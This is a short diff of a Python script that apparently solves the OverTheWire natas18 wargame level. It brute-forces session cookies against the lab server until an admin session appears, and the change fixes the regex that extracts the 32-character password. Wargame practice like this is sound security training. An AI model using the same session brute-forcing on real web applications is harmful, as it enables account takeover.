@@ -16,5 +16,5 @@ while r.text.find('You are an admin') == -1:
     print(count)
     r = requests.get('http://natas18.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
     count += 1
-    pass_regex = '[a-zA-Z0-9]'
-    print(re.findall(pass_regex, r.text)[1])
+pass_regex = '[a-zA-Z0-9]{32}'
+print(re.findall(pass_regex, r.text)[1])
